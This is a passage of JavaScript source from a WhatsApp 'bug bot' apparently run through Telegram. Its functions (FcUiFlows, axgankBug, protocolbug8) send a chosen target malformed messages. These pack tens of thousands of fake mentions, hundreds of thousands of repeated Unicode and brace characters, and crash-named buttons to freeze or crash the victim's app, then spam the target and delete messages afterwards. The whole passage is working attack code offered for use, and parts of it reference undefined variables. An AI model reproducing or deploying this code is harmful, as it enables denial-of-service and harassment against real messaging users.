        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "BERISIK WOI DIEM JING!",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🚀" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "99999999999@newsletter",
                            serverMessageId: 1,
                            newsletterName: "BERISIK NGENT..."
                        }
                    },
                    description: "horeg jambuu",
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const messages = generateWAMessageFromContent(target, MSG, {});

    await yamz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
    
  const audioMessage = {
    url: "https://mmg.whatsapp.net/audio_sample_url.enc?ccb=11-4&oh=01_sample&oe=sample&_nc_sid=5e03e0",
    mimetype: "audio/mpeg",
    fileSha256: "abc123def456ghi789jkl012mno345pqr678stu901vwx234yz567abc890def12",
    fileLength: 10485760,
    seconds: 3600,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath: "/v/audio_sample.enc?ccb=11-4&oh=01_sample&oe=sample&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: "DENGERIN NIH SUARA HOREG LU AJG BIKIN DELAY OTAK_-",
        body: "\u0000".repeat(5000),
        mediaType: 2,
        renderLargerThumbnail: true,
        thumbnailUrl: null,
        sourceUrl: "https://" + "ꦾ".repeat(100) + ".com/"
      },
      businessMessageForwardInfo: {
        businessOwnerJid: target
      },
      quotedMessage,
      isSampled: true,
      mentionedJid: mentionedList
    }
  };

const ForceInfused = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "騒々しいホレグ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            version: 3,
            paramsJson: JSON.stringify({
              trigger: true,
              action: "call_crash",
              note: "騒々しいホレグ",
              filler: "꧔".repeat(50000)
            })
          }
        }
      }
    },
    nativeFlowMessage: {
      name: "render_crash_component",
      messageParamsJson: "{".repeat(70000)
    },
    audioMessage: {
      mimetype: "audio/ogg; codecs=opus",
      fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
      fileLength: "9999999999",
      seconds: 999999,
      ptt: true,
      streamingSidecar: "騒々しいホレグ".repeat(9999)
    }
  };

  await yamz.relayMessage(target, { message: Crash }, { messageId: "Msg.Key.Id" });

  const msg = generateWAMessageFromContent(
    target,
    { viewOnceMessage: { message: { audioMessage } } },
    {}
  );

  await yamz.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    }
  );

  if (mention) {
    await yamz.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" }
          }
        ]
      }
    );
  }
}
///////////Func Fc Ui//////////////
async function FcUiFlows(target, mention) {
  const mentionedJidList = [
    target,
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 2000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const Params = "{[(".repeat(20000);

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            hasMediaAttachment: false
          },
          body: {
            text: "</𖥂 gw Ganteng\\>"
          },
          nativeFlowMessage: {
            messageParamsJson: Params,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "send_location",
                buttonParamsJson: "{}"
              },
              {
                name: "payment_method",
                buttonParamsJson: ""
              },
              {
                name: "form_message",
                buttonParamsJson: ""
              },
              {
                name: "catalog_message",
                buttonParamsJson: ""
              },
              {
                name: "review_and_pay",
                buttonParamsJson: ""
              },
              {
                name: "mpm",
                buttonParamsJson: ""
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            forwardingScore: 250208,
            isForwarded: false,
            mentionedJid: mentionedJidList
          }
        }
      }
    }
  }, {});

  await yamz.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });

  await sleep(1);

  await yamz.sendMessage(target, { delete: msg.key });
}
/////////////[FUNC AXGAN]//////////////
async function axgankBug(target, yamz) {
  try {
    const mentionedMetaAi = [
      "13135550001@s.whatsapp.net", "13135550002@s.whatsapp.net",
      "13135550003@s.whatsapp.net", "13135550004@s.whatsapp.net",
      "13135550005@s.whatsapp.net", "13135550006@s.whatsapp.net",
      "13135550007@s.whatsapp.net", "13135550008@s.whatsapp.net",
      "13135550009@s.whatsapp.net", "13135550010@s.whatsapp.net"
    ];
    const metaSpam = Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);
    const textSpam = "᬴".repeat(250000);
    const mentionSpam = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    const invisibleChar = '\u2063'.repeat(500000) + "@0".repeat(50000);
    const contactName = "🩸⃟ ༚ 𝑨𝑿𝑮𝒂𝒏𝑲⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣";
    const triggerChar = "𑇂𑆵𑆴𑆿".repeat(60000);
    const contactAmount = 200;
    const corruptedJson = "{".repeat(500000);
    const mention40k = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const mention16k = Array.from({ length: 1600 }, () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`);
    const randomMentions = Array.from({ length: 10 }, () => "0@s.whatsapp.net");

    await yamz.relayMessage(target, {
      orderMessage: {
        orderId: "1228296005631191",
        thumbnail: { url: "https://files.catbox.moe/ykvioj.jpg" },
        itemCount: 9999999999,
        status: "INQUIRY",
        surface: "CATALOG",
        message: `${'ꦾ'.repeat(60000)}`,
        orderTitle: "🩸⃟ ༚ 𝑨𝑿𝑮𝒂𝒏𝑲⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣",
        sellerJid: "5521992999999@s.whatsapp.net",
        token: "Ad/leFmSZ2bEez5oa0i8hasyGqCqqo245Pqu8XY6oaPQRw==",
        totalAmount1000: "9999999999",
        totalCurrencyCode: "USD",
        messageVersion: 2,
        viewOnce: true,
        contextInfo: {
          mentionedJid: [target, ...mentionedMetaAi, ...metaSpam],
          externalAdReply: {
            title: "ꦾ".repeat(20000),
            mediaType: 2,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            containsAutoReply: true,
            body: "©LuciferNotDev",
            thumbnail: { url: "https://files.catbox.moe/kst7w4.jpg" },
            sourceUrl: "about:blank",
            sourceId: client.generateMessageTag(),
            ctwaClid: "ctwaClid",
            ref: "ref",
            clickToWhatsappCall: true,
            ctaPayload: "ctaPayload",
            disableNudge: false,
            originalimgLink: "about:blank"
          },
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: 0,
              durationSecs: "9999",
              callType: "VIDEO",
              participants: [{ jid: target, callOutcome: 1 }]
            }
          }
        }
      }
    }, {});

    await yamz.sendMessage(target, {
      text: textSpam,
      contextInfo: { mentionedJid: mentionSpam }
    }, { quoted: null });

    await yamz.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 9999,
                degreesLongitude: 9999
              },
              hasMediaAttachment: true
            },
            body: { text: invisibleChar },
            nativeFlowMessage: {},
            contextInfo: { mentionedJid: randomMentions }
          },
          groupStatusMentionMessage: {
            groupJid: target,
            mentionedJid: randomMentions,
            contextInfo: { mentionedJid: randomMentions }
          }
        }
      }
    }, {
      participant: { jid: target },
      messageId: undefined
    });

    const contacts = Array.from({ length: contactAmount }, () => ({
      displayName: `${contactName + triggerChar}`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${contactName};;;\nFN:${contactName}\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
    }));

    await yamz.relayMessage(target, {
      contactsArrayMessage: {
        displayName: `${contactName + triggerChar}`,
        contacts,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          quotedAd: {
            advertiserName: "x",
            mediaType: "IMAGE",
            jpegThumbnail: "" 
          }
        }
      }
    }, {});

    const payloadDelay1 = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: "",
            fileLength: "9999999999999",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            height: 1,
            width: 1,
            jpegThumbnail: Buffer.from("").toString("base64"),
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "⟅ ༑ ▾𝐀𝐗𝐆𝐀𝐍𝐊 • 𝐗-𝐂𝐎𝐑𝐄⟅ ༑ ▾" },
            footer: { text: "🩸 ༑ 𝐀𝐗𝐆𝐀𝐍𝐊 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒⟅ ༑ 🩸" },
            nativeFlowMessage: { messageParamsJson: corruptedJson },
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };

    await yamz.relayMessage("status@broadcast", payloadDelay1, {
      messageId: null,
      statusJidList: [target]
    });

    await yamz.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🩸⃟ ༚ 𝑨𝑿𝑮𝒂𝒏𝑲⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣",
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc?ccb=11-4&oh=...",
                mimetype: "image/jpeg",
                caption: "{ null ) } Sigma \u0000 Bokep 100030 caption: bokep",
                height: 819,
                width: 1792,
                jpegThumbnail: Buffer.from("").toString("base64"),
                mediaKey: "WedxqVzBgUBbL09L7VUT52ILfzMdRnJsjUPL0OuLUmQ=",
                mediaKeyTimestamp: "1752001602"
              },
              hasMediaAttachment: true
            },
            body: { text: "🩸⃟ ༚ 𝑨𝑿𝑮𝒂𝒏𝑲⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣" },
            nativeFlowMessage: {
              buttons: [
                { name: "galaxy_message", buttonParamsJson: "[".repeat(29999) },
                { name: "galaxy_message", buttonParamsJson: "{".repeat(38888) }
              ],
              messageParamsJson: "{".repeat(10000)
            },
            contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" }
          }
        }
      }
    }, {});

    console.log("Succes Send to target!");

  } catch (err) {
    console.error("❌ Error in function bug axgankBug:", err);
  }
}
/////////////[Func Sampah]////////////
async function protocolbug8(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 50000000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".yamz Modderx" + "ោ៝".repeat(100000),
        title: "yamz X ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "Kyzz Xvisible V2",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(target, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
        await yamz.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await yamz.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}        
// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
▄▀▀ █ █░░ █▀ █▄░█ ▀█▀
░▀▄ █ █░░ █▀ █░▀█ ░█░
▀▀░ ▀ ▀▀▀ ▀▀ ▀░░▀ ░▀░
█▀▄ █▀ ▄▀▄ ▀█▀ █░█
█░█ █▀ █▀█ ░█░ █▀█
▀▀░ ▀▀ ▀░▀ ░▀░ ▀░▀
`));
console.log(chalk.redBright.bold(`
❍═━═━═━═━═━═━═━═━━❍
┃𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : 𝐘𝐀𝐌𝐙𝐙 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋
║𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 𝟐.𝟎                  
┃𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 : @yamzzoffc
║𝐒𝐓𝐀𝐓𝐔𝐒 : 𝐕𝐕𝐈𝐏
❍═━═━═━═━═━═━═━═━═❍
`));
console.log(chalk.greenBright.bold(`
┏┉┅┉┅┉┅┉┅┉┅┉┅┉┅┉┓
║    𝐓𝐄𝐋𝐀𝐇 𝐓𝐄𝐑𝐇𝐔𝐁𝐔𝐍𝐆    ║
╠━═━═━═━═━═━═━═━╣         
║ 𝐌𝐄𝐌𝐔𝐋𝐀𝐈 𝐒𝐄𝐒𝐈 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏║
┗┉┅┉┅┉┅┉┅┉┅┉┅┉┅┉┛
`));
startSesi();
bot.launch();
})();